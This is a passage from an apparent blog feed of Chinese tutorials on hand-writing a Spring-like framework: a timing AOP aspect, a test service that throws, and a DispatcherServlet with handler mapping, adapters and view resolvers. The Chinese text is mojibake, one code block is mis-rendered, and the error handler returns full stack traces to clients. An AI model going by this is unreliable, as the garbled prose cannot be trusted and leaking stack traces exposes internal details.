‡æ–¹æ³•æ¯æ¬¡æ‰§è¡Œæ‰€æ¶ˆè€—çš„æ—¶é—´</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Slf4j</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogAspect</span> &#123;    <span class="hljs-comment">//åœ¨è°ƒç”¨ä¸€ä¸ªæ–¹æ³•ä¹‹å‰ï¼Œæ‰§è¡Œbeforeæ–¹æ³•</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">(MyJoinPoint joinPoint)</span>&#123;        joinPoint.setUserAttribute(<span class="hljs-string">&quot;startTime_&quot;</span> + joinPoint.getMethod().getName(),System.currentTimeMillis());        <span class="hljs-comment">//è¿™ä¸ªæ–¹æ³•ä¸­çš„é€»è¾‘ï¼Œæ˜¯ç”±æˆ‘ä»¬è‡ªå·±å†™çš„</span>        log.info(<span class="hljs-string">&quot;Invoker Before Method!!!&quot;</span> +                <span class="hljs-string">&quot;\nTargetObject:&quot;</span> +  joinPoint.getThis() +                <span class="hljs-string">&quot;\nArgs:&quot;</span> + Arrays.toString(joinPoint.getArguments()));    &#125;    <span class="hljs-comment">//åœ¨è°ƒç”¨ä¸€ä¸ªæ–¹æ³•ä¹‹åï¼Œæ‰§è¡Œafteræ–¹æ³•</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">(MyJoinPoint joinPoint)</span>&#123;        log.info(<span class="hljs-string">&quot;Invoker After Method!!!&quot;</span> +                <span class="hljs-string">&quot;\nTargetObject:&quot;</span> +  joinPoint.getThis() +                <span class="hljs-string">&quot;\nArgs:&quot;</span> + Arrays.toString(joinPoint.getArguments()));        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> (Long) joinPoint.getUserAttribute(<span class="hljs-string">&quot;startTime_&quot;</span> + joinPoint.getMethod().getName());        <span class="hljs-type">long</span> <span class="hljs-variable">endTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();        System.out.println(<span class="hljs-string">&quot;use time :&quot;</span> + (endTime - startTime));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterThrowing</span><span class="hljs-params">(MyJoinPoint joinPoint, Throwable ex)</span>&#123;        log.info(<span class="hljs-string">&quot;å‡ºç°å¼‚å¸¸&quot;</span> +                <span class="hljs-string">&quot;\nTargetObject:&quot;</span> +  joinPoint.getThis() +                <span class="hljs-string">&quot;\nArgs:&quot;</span> + Arrays.toString(joinPoint.getArguments()) +                <span class="hljs-string">&quot;\nThrows:&quot;</span> + ex.getMessage());    &#125;&#125;</code></pre></div></li><li><p>ä¿®æ”¹ä¸‹ModifyServiceï¼Œåœ¨é‡Œé¢æ•…æ„æŠ›å‡ºå¼‚å¸¸æµ‹è¯•</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.service.impl;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.ModifyService;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModifyServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ModifyService</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * å¢åŠ </span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">add</span><span class="hljs-params">(String name, String address)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;æ•…æ„æŠ›å‡ºå¼‚å¸¸ï¼Œæµ‹è¯•å‰é¢é€šçŸ¥æ˜¯å¦ç”Ÿæ•ˆï¼ï¼ï¼&quot;</span>);<span class="hljs-comment">//        return &quot;modifyService add,name=&quot; + name + &quot;,address=&quot; + address;</span>    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * ä¿®æ”¹</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">edit</span><span class="hljs-params">(Integer id, String name)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;modifyService edit,id=&quot;</span> + id + <span class="hljs-string">&quot;,name=&quot;</span> + name;    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * åˆ é™¤</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">remove</span><span class="hljs-params">(Integer id)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;modifyService id=&quot;</span> + id;    &#125;&#125;</code></pre></div></li></ul><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><ul><li><p><a href="http://localhost:8080/luelueking_Spring_Source_war/web/add.json%E4%BB%A5%E5%8F%8A%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA">http://localhost:8080/luelueking_Spring_Source_war/web/add.jsonä»¥åŠæ§åˆ¶å°è¾“å‡º</a></p><p><img src="https://img-blog.csdnimg.cn/a338882902644733b0f70c0f43f3cec7.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li><li><p>æ§åˆ¶å°è¾“å‡º</p><p><img src="https://img-blog.csdnimg.cn/c330b50209f345b084da7265a01af7f5.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li><li><p><a href="http://localhost:8080/luelueking_Spring_Source_war/web/query.json?name=luelueking">http://localhost:8080/luelueking_Spring_Source_war/web/query.json?name=luelueking</a></p><p><img src="https://img-blog.csdnimg.cn/41241b598af449cfa20ee9b905846791.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li><li><p>æ§åˆ¶å°è¾“å‡º</p><p><img src="https://img-blog.csdnimg.cn/797a1a7ab93946ca88220134eb3bb57e.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>æ‰‹å†™spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æš‘å‡æœ€åå‡ å¤©ï¼è‚çˆ†ï¼ˆæ‰‹å†™ï¼‰ä¸€ä¸ªSpringä¹‹Day4</title>
    <link href="/2022/08/16/spring_day04/"/>
    <url>/2022/08/16/spring_day04/</url>
    
    <content type="html"><![CDATA[<h1 id="Day04â€”Spring-MVCæˆ‘æ¥è¾£"><a href="#Day04â€”Spring-MVCæˆ‘æ¥è¾£" class="headerlink" title="Day04â€”Spring MVCæˆ‘æ¥è¾£"></a>Day04â€”Spring MVCæˆ‘æ¥è¾£</h1><p>[TOC]</p><h2 id="DispatcherServletå…¥å£å»ºè®¾"><a href="#DispatcherServletå…¥å£å»ºè®¾" class="headerlink" title="DispatcherServletå…¥å£å»ºè®¾"></a>DispatcherServletå…¥å£å»ºè®¾</h2><ul><li><p>å®šä¹‰ä¸‹å…¨å±€å˜é‡</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc.servlet;<span class="hljs-keyword">import</span> com.czh.spring.framework.context.MyApplicationContext;<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-comment">/**</span><span class="hljs-comment"> * åªä½œä¸ºä¸€ä¸ªMVCçš„å¯åŠ¨å…¥å£</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Slf4j</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LOCATION</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;contextConfigLocation&quot;</span>;        <span class="hljs-keyword">private</span> List&lt;MyHandlerMapping&gt; handlerMappings = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        <span class="hljs-keyword">private</span> Map&lt;MyHandlerMapping,HandlerAdaptor&gt; handlerAdaptors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();        <span class="hljs-keyword">private</span> List&lt;MyViewResolver&gt; viewResolvers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        <span class="hljs-keyword">private</span> MyApplicationContext context;&#125;</code></pre></div></li><li><p>initæ–¹æ³•å®ŒæˆIoCå®¹å™¨çš„åˆå§‹åŒ–å’ŒMVCä¹å¤§ç»„ä»¶çš„åˆå§‹åŒ–</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;      <span class="hljs-comment">//åˆå§‹åŒ–IoCå®¹å™¨</span>      context = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyApplicationContext</span>(config.getInitParameter(LOCATION));      <span class="hljs-comment">//åˆå§‹åŒ–ä¹å¤§ç»„ä»¶</span>      initStrategies(context);  &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initStrategies</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;      <span class="hljs-comment">//æœ‰ä¹ç§ç­–ç•¥</span>      <span class="hljs-comment">//é’ˆå¯¹æ¯ä¸ªç”¨æˆ·çš„è¯·æ±‚ï¼Œéƒ½ä¼šç»è¿‡ä¸€äº›å¤„ç†ç­–ç•¥å¤„ç†ï¼Œæœ€ç»ˆæ‰èƒ½æœ‰ç»“æœè¾“å‡º</span>      <span class="hljs-comment">//æ¯ç§ç­–ç•¥å¯ä»¥è‡ªå®šä¹‰å¹²é¢„ï¼Œä½†æ˜¯æœ€ç»ˆç»“æœéƒ½ä¸€è‡´</span>      <span class="hljs-comment">//============ä¹=å¤§=ç»„=ä»¶==========</span>      initMultipartResolver(context);<span class="hljs-comment">//æ–‡ä»¶ä¸Šä¼ è§£æï¼Œå¦‚æœè¯·æ±‚ç±»å‹æ˜¯multipart,å°†é€šè¿‡MultipartResolverè¿›è¡Œæ–‡ä»¶ä¸Šä¼ è§£æ</span>      initLocaleResolver(context);<span class="hljs-comment">//æœ¬åœ°åŒ–è§£æ</span>      initThemeResolver(context);<span class="hljs-comment">//ä¸»é¢˜è§£æ</span>        initHandlerMappings(context);<span class="hljs-comment">//é€šè¿‡HandlerMappingå°†è¯·æ±‚æ˜ å°„åˆ°å¤„ç†å™¨</span>      initHandlerAdapters(context);<span class="hljs-comment">//é€šè¿‡HandlerAdapterè¿›è¡Œå¤šç±»å‹çš„å‚æ•°åŠ¨æ€åŒ¹é…</span>        initHandlerExceptionResolvers(context);<span class="hljs-comment">//å¦‚æœæ‰§è¡Œè¿‡ç¨‹ä¸­é‡åˆ°å¼‚å¸¸ï¼Œå°†äº¤ç»™HandlerExceptionResolveræ¥è§£æ</span>      initRequestToViewNameTranslator(context);<span class="hljs-comment">//ç›´æ¥å°†è¯·æ±‚è§£æåˆ°è§†å›¾å</span>        initViewResolvers(context);<span class="hljs-comment">//é€šè¿‡viewResolverå°†é€»è¾‘è§†å›¾è§£æåˆ°å…·ä½“è§†å›¾å®ç°</span>        initFlashMapManager(context);<span class="hljs-comment">//Flashæ˜ å°„ç®¡ç†å™¨</span>      <span class="hljs-comment">//=================================</span>  &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerMappings</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerAdapters</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initFlashMapManager</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initViewResolvers</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initRequestToViewNameTranslator</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerExceptionResolvers</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initThemeResolver</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initLocaleResolver</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initMultipartResolver</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;</code></pre></div></li></ul><h2 id="MyHandlerMapping"><a href="#MyHandlerMapping" class="headerlink" title="MyHandlerMapping"></a>MyHandlerMapping</h2><ul><li><p>HandlerMappingä¸»è¦å°±æ˜¯ç”¨æ¥ä¿å­˜URLå’ŒMethodçš„å¯¹åº”å…³ç³»ï¼Œç­–ç•¥æ¨¡å¼</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.regex.Pattern;<span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandlerMapping</span> &#123;    <span class="hljs-keyword">private</span> Object controller;<span class="hljs-comment">//ä¿å­˜æ–¹æ³•å¯¹åº”çš„å®ä¾‹</span>    <span class="hljs-keyword">private</span> Method method;<span class="hljs-comment">//ä¿å­˜æ˜ å°„çš„æ–¹æ³•</span>    <span class="hljs-keyword">private</span> Pattern pattern;    <span class="hljs-comment">//URLçš„æ­£åˆ™åŒ¹é…</span>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyHandlerMapping</span><span class="hljs-params">(Pattern pattern,Object controller, Method method)</span> &#123;        <span class="hljs-built_in">this</span>.controller = controller;        <span class="hljs-built_in">this</span>.method = method;        <span class="hljs-built_in">this</span>.pattern = pattern;    &#125;&#125;</code></pre></div></li><li><p>DispatcherServletå®Œå–„initHandlerMappingsæ–¹æ³•</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment">   * å°†Controllerä¸­é…ç½®çš„RequestMappingå’ŒMethodè¿›è¡Œä¸€ä¸€å¯¹åº”</span><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> context</span><span class="hljs-comment">   */</span>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerMappings</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;      <span class="hljs-comment">//æŒ‰ç…§æˆ‘ä»¬é€šå¸¸çš„ç†è§£åº”è¯¥æ˜¯ä¸€ä¸ªMap</span>      String[] beanNames = context.getBeanDefinitionNames();        <span class="hljs-keyword">try</span> &#123;          <span class="hljs-keyword">for</span> (String beanName : beanNames) &#123;              <span class="hljs-type">Object</span> <span class="hljs-variable">controller</span> <span class="hljs-operator">=</span> context.getBean(beanName);              Class&lt;?&gt; clazz = controller.getClass();              <span class="hljs-keyword">if</span>(!clazz.isAnnotationPresent(MyController.class))<span class="hljs-keyword">continue</span>;              <span class="hljs-type">String</span> <span class="hljs-variable">baseUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;                <span class="hljs-keyword">if</span>(clazz.isAnnotationPresent(MyRequestMapping.class))&#123;                  <span class="hljs-type">MyRequestMapping</span> <span class="hljs-variable">requestMapping</span> <span class="hljs-operator">=</span> clazz.getAnnotation(MyRequestMapping.class);                  baseUrl = requestMapping.value();              &#125;                <span class="hljs-comment">//æ‰«ææ‰€æœ‰çš„publicç±»å‹çš„æ–¹æ³•</span>              Method[] methods = clazz.getMethods();              <span class="hljs-keyword">for</span> (Method method : methods) &#123;                  <span class="hljs-keyword">if</span>(!method.isAnnotationPresent(MyRequestMapping.class))<span class="hljs-keyword">continue</span>;                    <span class="hljs-type">MyRequestMapping</span> <span class="hljs-variable">requestMapping</span> <span class="hljs-operator">=</span> method.getAnnotation(MyRequestMapping.class);                  <span class="hljs-comment">//è‡ªå·±ç»†å“</span><span class="hljs-type">String</span> <span class="hljs-variable">regex</span> <span class="hljs-operator">=</span> (<span class="hljs-string">&quot;/&quot;</span> + baseUrl + <span class="hljs-string">&quot;/&quot;</span> + requestMapping.value().replaceAll(<span class="hljs-string">&quot;\\*&quot;</span>, <span class="hljs-string">&quot;.*&quot;</span>)).replaceAll(<span class="hljs-string">&quot;/+&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>);                  <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(regex);                  <span class="hljs-built_in">this</span>.handlerMappings.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandlerMapping</span>(pattern,controller,method));                  log.info(<span class="hljs-string">&quot;Mapping: &quot;</span>+regex+<span class="hljs-string">&quot;,&quot;</span>+method);              &#125;          &#125;      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;          e.printStackTrace();      &#125;  &#125;</code></pre></div></li></ul><h2 id="MyHandlerAdapteråˆ›å»º"><a href="#MyHandlerAdapteråˆ›å»º" class="headerlink" title="MyHandlerAdapteråˆ›å»º"></a>MyHandlerAdapteråˆ›å»º</h2><ul><li><p>HandlerAdapterä¸»è¦å®Œæˆè¯·æ±‚ä¼ é€’åˆ°æœåŠ¡ç«¯çš„å‚æ•°åˆ—è¡¨ä¸Methodå®å‚åˆ—è¡¨çš„å¯¹åº”å…³ç³»ï¼Œå®Œæˆå‚æ•°å€¼çš„ç±»å‹è½¬æ¢å·¥ä½œã€‚æ ¸å¿ƒæ–¹æ³•æ˜¯handle()ã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandlerAdapter</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(Object handler)</span>&#123;        <span class="hljs-keyword">return</span> (handler <span class="hljs-keyword">instanceof</span> MyHandlerMapping);    &#125;    <span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp,Object handler)</span><span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;</code></pre></div></li><li><p>æš‚æ—¶å…ˆè¿™æ ·ï¼Œå†åˆ›å»ºä¸€ä¸ªMyModelAndViewç±»</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyModelAndView</span> &#123;&#125;</code></pre></div></li><li><p>DispatcherServletå®Œå–„initHandlerAdaptersæ–¹æ³•</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerAdapters</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;    <span class="hljs-comment">//åˆå§‹åŒ–é˜¶æ®µï¼Œæˆ‘ä»¬èƒ½åšçš„å°±æ˜¯å°†è¿™äº›å‚æ•°çš„åå­—æˆ–è€…ç±»å‹æŒ‰ä¸€å®šçš„é¡ºåºä¿å­˜ä¸‹æ¥</span>    <span class="hljs-comment">//å› ä¸ºåé¢ç”¨åå°„è°ƒç”¨çš„æ—¶å€™ï¼Œä¼ çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„</span>    <span class="hljs-comment">//å¯ä»¥é€šè¿‡è®°å½•è¿™äº›å‚æ•°çš„ä½ç½®indexï¼Œé€ä¸ªä»æ•°ç»„ä¸­å–å€¼ï¼Œè¿™æ ·å°±å’Œå‚æ•°çš„é¡ºåºæ— å…³äº†</span>    <span class="hljs-keyword">for</span> (MyHandlerMapping handlerMapping : <span class="hljs-built_in">this</span>.handlerMappings) &#123;        <span class="hljs-built_in">this</span>.handlerAdaptors.put(handlerMapping,<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandlerAdapter</span>());    &#125;&#125;</code></pre></div></li></ul><h2 id="MyViewResolveråˆ›å»º"><a href="#MyViewResolveråˆ›å»º" class="headerlink" title="MyViewResolveråˆ›å»º"></a>MyViewResolveråˆ›å»º</h2><ul><li><p>&#96;&#96;&#96;java<br>package com.czh.spring.framework.webmvc;</p><p>public class MyViewResolver {<br>}</p><div class="code-wrapper"><pre><code class="hljs reasonml">- DispatcherServletå®Œå–„initViewResolversæ–¹æ³•  ```java     <span class="hljs-keyword">private</span> void init<span class="hljs-constructor">ViewResolvers(MyApplicationContext <span class="hljs-params">context</span>)</span> &#123;          <span class="hljs-comment">//è§£å†³é¡µé¢åå­—å’Œæ¨¡ç‰ˆæ–‡ä»¶å…³è”é—®é¢˜</span>          String templateRoot = context.get<span class="hljs-constructor">Config()</span>.get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;templateRoot&quot;</span>)</span>;          String templateRootPath = this.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">ClassLoader()</span>.get<span class="hljs-constructor">Resource(<span class="hljs-params">templateRoot</span>)</span>.get<span class="hljs-constructor">File()</span>;            File templateRootDir = <span class="hljs-keyword">new</span> <span class="hljs-constructor">File(<span class="hljs-params">templateRootPath</span>)</span>;          String<span class="hljs-literal">[]</span> templates = templateRootDir.<span class="hljs-built_in">list</span><span class="hljs-literal">()</span>;          <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; templates.length; i++) &#123;              <span class="hljs-comment">//è¿™é‡Œä¸»è¦æ˜¯ä¸ºäº†å…¼å®¹å¤šæ¨¡æ¿ï¼Œæ‰€æœ‰æ¨¡ä»¿Springç”¨Listä¿å­˜</span>              <span class="hljs-comment">//åœ¨æˆ‘å†™çš„ä»£ç ä¸­ç®€åŒ–äº†ï¼Œå…¶å®åªæœ‰éœ€è¦ä¸€ä¸ªæ¨¡æ¿å°±å¯ä»¥æå®š</span>              <span class="hljs-comment">//åªæ˜¯ä¸ºäº†ä»¿çœŸï¼Œæ‰€æœ‰è¿˜æ˜¯æäº†ä¸ªList</span>              this.viewResolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-constructor">MyViewResolver(<span class="hljs-params">templateRoot</span>)</span>);          &#125;      &#125;</code></pre></div></li></ul><h2 id="DispatcherServletä¸­Serviceæ–¹æ³•"><a href="#DispatcherServletä¸­Serviceæ–¹æ³•" class="headerlink" title="DispatcherServletä¸­Serviceæ–¹æ³•"></a>DispatcherServletä¸­Serviceæ–¹æ³•</h2><ul><li><p>åˆå§‹åŒ–éƒ½æ•´å®Œäº†ï¼Œæ¥çœ‹service()æ–¹æ³•ï¼Œä¸»è¦è´Ÿè´£æ¥æ”¶è¯·æ±‚ï¼Œå¾—åˆ°Requestå’ŒResponseå¯¹è±¡ã€‚åœ¨Servletå­ç±»çš„service()æ–¹æ³•è¢«æ‹†åˆ†æˆdoGet()å’ŒdoPost()æ–¹æ³•ã€‚çœŸæ­£è°ƒç”¨é€»è¾‘ç”¨doDispatch()æ¥æ‰§è¡Œã€‚</p><div class="code-wrapper"><pre><code class="hljs java">    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">this</span>.doPost(req,resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-keyword">try</span> &#123;            doDispatch(req,resp);        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            resp.getWriter().write(<span class="hljs-string">&quot;500 Exception,Details:\r\n&quot;</span> +                     Arrays.toString(e.getStackTrace())                            .replaceAll(<span class="hljs-string">&quot;\\[|\\]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)                            .replaceAll(<span class="hljs-string">&quot;,\\s&quot;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>));            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-comment">//æ ¹æ®ç”¨æˆ·è¯·æ±‚çš„URLæ¥è·å¾—ä¸€ä¸ªHandler</span>        <span class="hljs-type">MyHandlerMapping</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getHandler(req);        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == handler)&#123;            processDispatchResult(req,resp,<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyModelAndView</span>(<span class="hljs-string">&quot;404&quot;</span>));            <span class="hljs-keyword">return</span>;        &#125;                <span class="hljs-type">MyHandlerAdapter</span> <span class="hljs-variable">handlerAdapter</span> <span class="hljs-operator">=</span> getHandlerAdapter(handler);        <span class="hljs-type">MyModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> handlerAdapter.handle(req, resp, handler);                processDispatchResult(req,resp,mv);    &#125;    <span class="hljs-keyword">private</span> MyHandlerAdapter <span class="hljs-title function_">getHandlerAdapter</span><span class="hljs-params">(MyHandlerMapping handler)</span> &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.handlerAdaptors.isEmpty())<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;        <span class="hljs-type">MyHandlerAdapter</span> <span class="hljs-variable">handlerAdapter</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.handlerAdaptors.get(handler);        <span class="hljs-keyword">if</span>(handlerAdapter.supports(handler))&#123;            <span class="hljs-keyword">return</span> handlerAdapter;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processDispatchResult</span><span class="hljs-params">(HttpServletRequest request,HttpServletResponse response,MyModelAndView mv)</span><span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-comment">//è°ƒç”¨viewResolverçš„resolveViewName()æ–¹æ³•</span>        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == mv)<span class="hljs-keyword">return</span>;                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.viewResolvers.isEmpty())<span class="hljs-keyword">return</span>;                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.viewResolvers != <span class="hljs-literal">null</span>)&#123;            <span class="hljs-keyword">for</span> (MyViewResolver viewResolver : viewResolvers) &#123;                <span class="hljs-type">MyView</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> viewResolver.resolveViewName(mv.getViewName(),<span class="hljs-literal">null</span>);                <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != view)&#123;                    view.render(mv.getModel(),request,response);                    <span class="hljs-keyword">return</span>;                &#125;            &#125;        &#125;    &#125;    <span class="hljs-keyword">private</span> MyHandlerMapping <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.handlerMappings.isEmpty())<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> req.getRequestURI();        <span class="hljs-type">String</span> <span class="hljs-variable">contextPath</span> <span class="hljs-operator">=</span> req.getContextPath();        uri = uri.replace(contextPath,<span class="hljs-string">&quot;&quot;</span>).replaceAll(<span class="hljs-string">&quot;/+&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>);        <span class="hljs-keyword">for</span> (MyHandlerMapping handler : handlerMappings) &#123;            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> handler.getPattern().matcher(uri);            <span class="hljs-keyword">if</span>(!matcher.matches())<span class="hljs-keyword">continue</span>;            <span class="hljs-keyword">return</span> handler;        &#125;        <span class="hljs-keyword">return</span> <span 